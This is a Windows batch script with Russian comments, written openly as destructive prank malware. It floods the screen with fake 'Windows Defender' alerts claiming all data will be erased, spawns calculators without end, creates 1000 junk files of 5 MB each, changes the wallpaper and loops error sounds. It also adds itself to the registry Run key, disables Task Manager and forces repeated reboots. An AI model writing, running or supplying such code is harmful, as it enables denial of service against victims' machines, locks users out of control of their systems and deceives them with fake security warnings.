@echo off
chcp 1251 > nul
setlocal enabledelayedexpansion
title SYSTEM CORRUPTION IN PROGRESS

:: ===== 300000 ОКОН СРАЗУ =====
echo Launching 300,000 message windows...
for /l %%i in (1,1,1000) do (
    start /min cmd /c "for /l %%j in (1,1,300) do (start /b mshta vbscript:Execute(\"msgbox 'SYSTEM CORRUPTED. ALL DATA WILL BE ERASED.', 16, 'Windows Defender':close\"))"
)

:: ===== ВЕЧНЫЙ КАЛЬКУЛЯТОР =====
echo Spawning infinite calculator instances...
:calc_loop
start /min calc.exe
timeout /t 0.5 /nobreak >nul
goto calc_loop

:: ===== 1000 МУСОРНЫХ ФАЙЛОВ =====
echo Deploying 1000 garbage files...
set "garbage_dir=%userprofile%\Desktop\Garbage_Corruption"
mkdir "%garbage_dir%" 2>nul

for /l %%i in (1,1,1000) do (
    echo RANDOM SYSTEM DUMP %%i. SHA-512: !random!!random!!random!!random! > "%garbage_dir%\corrupt_%%i.bin"
    fsutil file createnew "%garbage_dir%\massive_junk_%%i.dat" 5242880
)

:: ===== СМЕНА ОБОЕВ НА УЖАСАЮЩУЮ КАРТИНКУ =====
echo Setting terror wallpaper...
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "https://i.imgur.com/EXAMPLE_TERROR_LARGE.jpg" /f
reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "10" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: ===== ВЕЧНЫЙ ЗВУК ОШИБКИ WINDOWS =====
echo Looping Windows error sound...
:sound_loop
powershell -c "(New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Error.wav').PlaySync();" 2>nul
timeout /t 0 /nobreak >nul
goto sound_loop

:: ===== ДОПОЛНИТЕЛЬНЫЙ ХАОС: БЛОКИРОВКА РЕЕСТРА И СЛУЧАЙНЫЕ ПЕРЕЗАГРУЗКИ =====
echo Injecting registry corruption...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Chaos /t REG_SZ /d "%~f0" /f 2>nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul

:chaos_loop
start /b cmd /c "shutdown /r /t 5 /c 'SYSTEM FAILURE. REBOOTING.'"
timeout /t 10 /nobreak >nul
goto chaos_loop
